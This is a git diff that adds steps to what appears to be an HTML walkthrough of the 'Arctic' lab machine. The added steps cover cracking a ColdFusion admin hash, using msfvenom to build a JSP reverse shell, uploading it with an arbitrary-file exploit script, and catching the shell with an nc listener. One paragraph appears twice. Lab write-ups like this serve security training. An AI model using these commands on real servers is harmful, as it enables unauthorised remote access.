@@ -21,6 +21,29 @@
                  console.log(hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A8FB07DCEC9B03')) 
                 Open burp suit (or any other request interceptor) and send a login request, intercept it and change the cfadminPassword= section to the has from console, then forward the request. 
             </p>
+            <br>
+            <p>Another method of logging into the admin in is using the hash finder tools. Using it I found that the password was happyday and login.<br>
+                 Also the site https://crackstation.net/ will decode the hash.</p>
+            <img src="img/arctic4">
+            <br>
+            <p>Press Debugging & Logging/Scheduled Tasks/ and Schedule New Task.  After that open command shell and generate a JSP reverse shell with the following command.
+                msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=4444 > shell.jsp<br>
+              Next, run the following shell.jsp exploit code, start a listing shell,  
+              Python arb-file-exploit.py 10.10.10.11 8500 shell.jsp<br>
+               nc -nlvp 4444 <br>
+              Then visit this link and you will get a shell on your listener. http://10.10.10.11:8500/CFIDE/shell.jsp
+              </p>
+           <img src="img/arctic5">
+           <br>
+           <h3>Uploading shell</h3>
+           <br>
+           <p>Another method of logging into the admin in is using the hash finder tools. Using it I found that the password was happyday and login.<br>
+            Also the site https://crackstation.net/ will decode the hash.</p>
+       <img src="img/arctic6">
+       <br>
+
+
+
                 
         
     </div>
